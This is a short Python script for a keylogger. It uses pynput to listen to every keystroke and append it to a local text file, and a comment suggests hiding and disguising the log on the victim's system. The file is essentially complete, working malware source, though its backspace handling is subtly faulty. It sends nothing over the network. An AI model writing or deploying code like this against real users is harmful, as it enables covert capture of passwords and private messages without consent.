# Pynput is the library that allows us to pick up inputs from the user
from pynput import keyboard
import os

# Create log file, for this purpose we don't need to hide it but you could create it anywhere on the users system and disguise it
logFile = os.path.expanduser("KeyloggerOutput.txt")

# onPress handles what to do when a key is pressed
def onPress(key):
    try:
        with open(logFile, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(logFile, "r+") as f:
            content = f.read()
            f.seek(0)

            if key == keyboard.Key.backspace:
                f.write(content[:-1])
            elif key == keyboard.Key.space:
                f.write(content + " ")
            elif key == keyboard.Key.enter:
                f.write(content + "\n")
            elif key == keyboard.Key.tab:
                f.write(content + "\t")
            else:
                f.write(content)
            

# This is what allows onPress to be called everytime a key is pressed, it "listens" for inputs
with keyboard.Listener(on_press=onPress) as listener:
    listener.join()
